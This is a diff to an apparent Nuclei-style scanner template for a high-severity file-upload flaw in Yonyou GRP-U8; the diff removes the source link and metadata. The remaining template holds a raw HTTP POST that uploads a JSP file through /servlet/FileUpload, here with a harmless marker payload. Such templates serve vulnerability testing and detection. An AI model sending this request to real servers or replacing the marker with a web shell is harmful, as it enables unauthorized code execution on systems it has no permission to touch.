@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8 FileUpload 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qudoggrlomsdr55g'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qudoggrlomsdr55g
-    fofa: app="用友-GRP-U8"
 http:
 - raw:
   - 'POST /servlet/FileUpload?fileName=dudesuite.jsp&actionID=update HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Connection: close
-
-
 
 
     <% out.println("dudesuite");%>
